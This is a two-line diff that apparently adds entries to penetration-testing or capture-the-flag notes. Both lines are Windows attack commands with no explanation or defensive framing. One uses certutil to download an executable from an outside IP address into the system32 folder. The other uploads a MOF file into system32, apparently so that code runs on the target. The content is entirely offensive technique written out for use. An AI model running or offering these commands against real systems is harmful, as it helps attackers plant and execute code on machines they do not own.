@@ -1,0 +1,2 @@
+* certutil -urlcache -split -f http://10.10.12.227/streams.exe c:/windows/system32/streams.exe
+* put initial.mof /windows/system32/jason.mof
